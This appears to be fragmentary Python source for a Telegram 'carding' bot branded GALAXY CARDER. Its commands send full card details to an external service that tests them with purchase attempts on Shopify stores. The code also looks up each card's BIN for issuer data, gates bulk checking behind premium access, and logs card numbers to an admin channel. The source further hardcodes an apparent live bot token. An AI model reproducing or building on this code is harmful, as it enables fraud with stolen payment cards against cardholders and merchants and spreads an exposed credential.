...
import json
import os
API_TOKEN = '8236013868:AAFigA2PMJIvqg9VzX4jNJ9eovvuxikjQ_c'  # <-- Your actual bot token here
...
ADMIN_ID = 7578581395  # <-- Replace with your actual Telegram ID



# main.py

from proxy import register_handlers
...
from sites import register_handlers
register_handlers(bot)

from shtxt import register_shtxt_handler
# from proxy import register_proxy_handler  # if needed

# Register handlers
register_shtxt_handler(bot)
# register_proxy_handler(bot)  # if needed
...
def display_domain_info(chat_id: int, domain: str, base_message_id: int):
    ...
    try:
        resp    = scraper.get(
            f"https://auto-shopify-6cz4.onrender.com/index.php?site={domain}&cc=4966230338334896|04|2028|561",
            timeout=20
        )
        raw     = resp.text.strip()
        stop_flag["stop"] = True
...
def cmd_seturl(message):
    ...
    display_domain_info(message.chat.id, domain, message.message_id)
...
def cmd_myurl(message):
    ...
    if not domain:
        return bot.send_message(
            message.chat.id,
            "ℹ️ <b><i>No domain set.</i></b> Use <code>/seturl your_shopify_domain</code> first.",
            parse_mode="HTML"
        )
    ...
    try:
        processing = bot.reply_to(
            message,
            "⏳ <b><i>Fetching your domain info…</i></b>",
            parse_mode="HTML"
        )
    except Exception:
    ...
    try:
        with open("id.txt", "r") as f:
            for line in f:
                ...
                uid, ts = line.split(':', 1)
                premium_users[int(uid)] = float(ts)
    except Exception as e:
        print(f"[ERROR] Failed to load premium users: {e}")
...
ADMIN_ID = 7578581395
LOG_CHANNEL = -1002711857436  # Log Channel
...
def handle_sh(message):
    ...
    try:
        ...
        api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={domain}&cc={fullz}"
        ...
        if status in decline_list:
            ...
            status_display = "<code>Thank you for your purchase 🔥</code>"
...
DECLINE_LIST = [
    ...
    "UNPROCESSABLE_TRANSACTION", "DECLINED", "INCORRECT_ZIP", "INVALID_TOKEN", "tax ammount empty"
]
APPROVE_LIST = [
...
def handle_selfshopify(message):
    ...
    # Call API
    api_url = "https://auto-shopify-6cz4.onrender.com/index.php"
    try:
        resp = requests.get(
            api_url,
    ...
    if resp.status_code == 403:
        return bot.edit_message_text("❌ <b>Access denied (403). Check API key or IP.</b>", chat_id, msg.message_id, parse_mode="HTML")
    ...
    # 🧠 FIXED: unpack tuple here
    brand, type_, level, bank, country = get_bin_info(cc.split("|")[0][:6])
...
<b><i>🏦 Bank:</i></b> {bank}
<b><i>💳 Type:</i></b> {type_}
<b><i>🧾 Scheme:</i></b> {brand}
<b><i>⭐ Level:</i></b> {level}
<b><i>🌍 Country:</i></b> {country}
<b><i>🪪 Status:</i></b> {user_status}
<b><i>👤 Checked by:</i></b> <a href='tg://user?id={user_id}'>{user_name}</a>
"""
...
ADMIN_ID = 7578581395  # Replace with your Telegram ID
...
ADMIN_ID = 7578581395  # replace with your actual admin ID
...
user_last_used  = {}
timeouts = {
    'chk': {'premium': PREMIUM_COOLDOWN, 'free': FREE_COOLDOWN},
    'mchk': {'premium': PREMIUM_COOLDOWN}
}
...
# ────────── COOLDOWN ──────────
def check_cooldown(message, command: str) -> bool:
    uid = message.from_user.id
    role = 'premium' if is_premium(uid) else 'free'
    wait = timeouts.get(command, {}).get(role)
    if not wait:
        return False
    user_last_used.setdefault(uid, {})
    last = user_last_used[uid].get(command, 0)
    now  = time.time()
    if now - last < wait:
        remaining = int(wait - (now - last))
        bot.reply_to(message, f"⏳ Please wait {remaining}s before using /{command} again.")
        return True
    user_last_used[uid][command] = now
    return False
...
def get_bin_info(bin_number):
    ...
    try:
        ...
        if r.ok:
            j = r.json()
            return (
                j.get("scheme","N/A").upper(),
                j.get("type","N/A").upper(),
                j.get("brand","N/A").upper(),
                j.get("bank",{}).get("name","N/A").upper(),
                f"{j.get('country',{}).get('name','N/A')} {j.get('country',{}).get('emoji','')}"
            )
    except:
        pass
    try:
        ...
        if r.ok:
            ...
            return (
                j.get("brand","N/A").upper(),
                j.get("type","N/A").upper(),
                j.get("level","N/A").upper(),
                j.get("bank","N/A").upper(),
                f"{j.get('country_name','N/A')} {j.get('country_flag','')}"
            )
    except:
        pass
...
def api_check(card):
    try:
        ...
        try:
            ...
            # not JSON at all
            return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", res.text.strip()

        # unwrap if returned as JSON-encoded string
        if isinstance(j, str):
            try:
                j = json.loads(j)
            except:
        ...
        # success: extract inner status
        if isinstance(j, dict) and j.get("success"):
            status_text = j.get("data", {}).get("status", "").capitalize() or "Approved"
            return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅", status_text
        ...
        try:
            bot.send_message(
                LOG_CHANNEL_ID,
                f"⚠️ Error checking card <code>{card}</code>:\n<pre>{e}</pre>",
                parse_mode="HTML"
            )
        except:
            pass
...
def send_premium_only_message(msg):
    bot.reply_to(msg, "❌ You need active premium access to use this command.")

# ────────── /chk ──────────
@bot.message_handler(func=lambda m: bool(re.match(r"^[!./_=:-]?chk\b", m.text or "", re.IGNORECASE)))
def chk_handler(msg):
    if check_cooldown(msg, 'chk'):
        return
    ...
    proc = bot.reply_to(
        msg,
        '<a href="https://t.me/Galaxy_Carders">〄</a> <b><i>Processing…</i></b>',
        parse_mode="HTML"
    )
    ...
    # log on generic failure
    if reason == "Something went wrong.":
        try:
            bot.send_message(
                LOG_CHANNEL_ID,
                f"⚠️ User @{msg.from_user.username or msg.from_user.id} triggered error on /chk\n"
    ...
    b, t, l, bank, country = get_bin_info(card.split("|")[0])
...
[{bullet}] <b>𝗕𝗢𝗧 𝗕𝗒:</b> <a href="{CHANNEL_URL}"><b><i>GALAXY CARDER</i></b></a>
[{bullet}] <b>𝗧𝗜𝗠𝗘:</b> {elapsed}
"""
    bot.edit_message_text(
        result, msg.chat.id, proc.message_id,
        parse_mode="HTML", disable_web_page_preview=True
    )

# ────────── /mchk ──────────
@bot.message_handler(func=lambda m: bool(re.match(r"^[!./_=:-]?mchk\b", m.text or "", re.IGNORECASE)))
def mchk_handler(message):
    if not is_premium(message.from_user.id):
        return send_premium_only_message(message)
    if check_cooldown(message, 'mchk'):
        return

    src = message.reply_to_message.text if message.reply_to_message else message.text
    cards = ["|".join(m.groups()) for m in CARD_REGEX.finditer(src)]
    if not cards:
    ...
    def worker():
        ...
        for idx, cc in enumerate(cards, start=1):
            ...
            if reason == "Something went wrong.":
                try:
                    bot.send_message(
                        LOG_CHANNEL_ID,
                        f"⚠️ User @{user.username or user.id} triggered error on /mchk\nCard: <code>{cc}</code>",
                        parse_mode="HTML"
                    )
                except:
                    pass
            ...
            try:
                bot.edit_message_text(
                    progress, sent_msg.chat.id, sent_msg.message_id,
                    parse_mode="HTML", disable_web_page_preview=True
                )
            except:
                pass
        ...
        final = (
            ...
            + f"{tag('𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜')} {user_link} [ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]\n"
            + "━ " * 13 + "\n"
            + f"𝐁𝐨𝐭 𝐁𝐲 ➜ <a href=\"{CHANNEL_URL}\">GALAXY CARDER</a>"
        )
        try:
            bot.edit_message_text(
                final, sent_msg.chat.id, sent_msg.message_id,
                parse_mode="HTML", disable_web_page_preview=True
            )
        except:
            pass
...
from stxt import register_stxt_handler
register_stxt_handler(bot)
